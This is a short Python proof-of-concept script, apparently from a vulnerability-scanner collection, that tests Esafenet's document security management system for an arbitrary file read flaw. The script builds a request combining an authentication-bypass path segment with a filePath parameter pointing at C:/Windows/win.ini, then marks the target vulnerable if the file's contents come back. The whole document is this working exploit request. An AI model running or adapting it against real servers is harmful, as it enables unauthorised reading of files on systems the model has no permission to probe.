import requests
import urllib

def verify(url):
    relsult = {
        'name': '亿赛通电子文档安全管理系统DecryptApplication存在任意文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C:///Windows/win.ini&uploadFileId=1&fileName1=test1111")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and '[fonts]' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult